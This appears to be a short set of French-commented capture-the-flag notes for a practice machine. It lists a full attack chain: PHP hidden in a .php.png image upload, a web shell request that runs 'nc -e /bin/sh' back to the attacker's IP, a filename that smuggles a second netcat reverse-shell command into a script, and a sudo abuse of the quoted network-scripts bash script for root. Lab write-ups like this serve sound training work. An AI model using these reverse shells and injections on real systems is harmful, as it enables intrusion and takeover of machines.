@@ -1,0 +1,45 @@
+//dans une image on mets le code php a la fin
+//on l appelle ****.php.png
+//sur un terminal on ouvre un listener
+nc -v  -n -l -p 1234
+//puis
+http://10.10.10.146/uploads/10_10_13_154.php.png?cmd=nc -e /bin/sh 10.10.13.154 1234; 
+//une fois connecter on ouvre un nouveau reverse pour avoir le user
+touch "; nc -nv 10.10.13.154 1919 -c bash;"
+//on ouvre un autre listener
+nc -v -n -l -p 1919
+//on trouve la faille avec
+sudo -l
+//on cree un lien symbolique pour eviter les points
+//on echape le ";" grace à l hexa
+0X3b cat /home/guly/drapeau
+//et c bon
+
+
+
+
+cd /usr/local/sbin
+
+
+#!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+	echo "interface $var:"
+	read x
+	while [[ ! $x =~ $regexp ]]; do
+		echo "wrong input, try again"
+		read x
+		echo "interface $var:"
+	done
+	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+  
+/sbin/ifup guly0
+
